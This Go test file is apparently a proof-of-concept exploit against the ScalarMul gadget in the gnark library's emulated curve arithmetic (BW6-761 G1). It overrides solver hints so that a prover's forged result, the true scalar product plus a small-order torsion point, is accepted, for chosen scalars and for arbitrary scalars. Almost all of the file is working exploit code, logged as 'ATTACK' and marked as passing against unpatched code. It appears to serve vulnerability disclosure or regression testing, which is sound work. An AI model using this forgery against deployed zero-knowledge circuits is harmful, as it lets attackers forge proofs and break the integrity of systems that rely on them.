package attack

// BW6-761 G1 (cofactor small part 2^2 * 127). Prime-field group handled by
// sw_emulated. Exhibits chosen-scalar (ell in {2,127}) and any-scalar (ell=2,
// both-zero route) forgeries against the public ScalarMul gadget.

import (
	"math/big"
	"testing"

	bw "github.com/consensys/gnark-crypto/ecc/bw6-761"
	bwfr "github.com/consensys/gnark-crypto/ecc/bw6-761/fr"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/std/algebra/emulated/sw_emulated"
	"github.com/consensys/gnark/std/math/emulated"
	"github.com/consensys/gnark/std/math/emulated/emparams"
)

var bwLambda, _ = new(big.Int).SetString("80949648264912719408558363140637477264845294720710499478137287262712535938301461879813459410945", 10)

type bw6761G1Circuit struct {
	P sw_emulated.AffinePoint[emparams.BW6761Fp]
	S emulated.Element[emparams.BW6761Fr]
	Q sw_emulated.AffinePoint[emparams.BW6761Fp]
}

func (c *bw6761G1Circuit) Define(api frontend.API) error {
	cr, err := sw_emulated.New[emparams.BW6761Fp, emparams.BW6761Fr](api, sw_emulated.GetBW6761Params())
	if err != nil {
		return err
	}
	res := cr.ScalarMul(&c.P, &c.S)
	cr.AssertIsEqual(res, &c.Q)
	return nil
}

func bwG1Point(p bw.G1Affine) sw_emulated.AffinePoint[emparams.BW6761Fp] {
	return sw_emulated.AffinePoint[emparams.BW6761Fp]{
		X: emulated.ValueOf[emparams.BW6761Fp](p.X),
		Y: emulated.ValueOf[emparams.BW6761Fp](p.Y),
	}
}

func solveBWG1(t *testing.T, P bw.G1Affine, s *big.Int, out bw.G1Affine, vec [4]*big.Int) error {
	ccs := compileOnce(t, "bwG1", &bw6761G1Circuit{})
	w := &bw6761G1Circuit{P: bwG1Point(P), S: emulated.ValueOf[emparams.BW6761Fr](s), Q: bwG1Point(out)}
	wit, err := frontend.NewWitness(w, scalarField())
	if err != nil {
		t.Fatal(err)
	}
	coords := []*big.Int{out.X.BigInt(new(big.Int)), out.Y.BigInt(new(big.Int))}
	hs := sw_emulated.GetHints()
	return ccs.IsSolved(wit,
		solver.OverrideHint(solver.GetHintID(hs[1]), forgeOutputHint(coords)),
		solver.OverrideHint(solver.GetHintID(hs[3]), forgeDecompHint(vec)),
	)
}

func TestBW6761G1(t *testing.T) {
	r := bwfr.Modulus()
	_, _, P, _ := bw.Generators()

	for _, ell := range []int64{2, 127} {
		s := chosenScalar(bwLambda, ell, r)
		T := bwG1Torsion(ell)
		var honest, forged bw.G1Affine
		honest.ScalarMultiplication(&P, s)
		forged.Add(&honest, &T)
		if err := solveBWG1(t, P, s, forged, chosenVec(ell)); err != nil {
			t.Fatalf("chosen-scalar ell=%d must be ACCEPTED (unpatched): %v", ell, err)
		}
		t.Logf("ATTACK chosen-scalar ell=%-6d accepted [s]P+T as [s]P", ell)
	}

	{
		ell := int64(2)
		s := anyScalar(r)
		vec := scaleDecomp(honestDecomp(s, r, bwLambda), ell)
		if maxAbsBits(vec) >= subScalarBits(r) {
			t.Fatalf("scaled decomposition overflows the sub-scalar range")
		}
		T := bwG1Torsion(ell)
		var honest, forged bw.G1Affine
		honest.ScalarMultiplication(&P, s)
		forged.Add(&honest, &T)
		if err := solveBWG1(t, P, s, forged, vec); err != nil {
			t.Fatalf("any-scalar ell=%d must be ACCEPTED (unpatched): %v", ell, err)
		}
		t.Logf("ATTACK any-scalar   ell=%-6d accepted [s]P+T as [s]P", ell)
	}
}
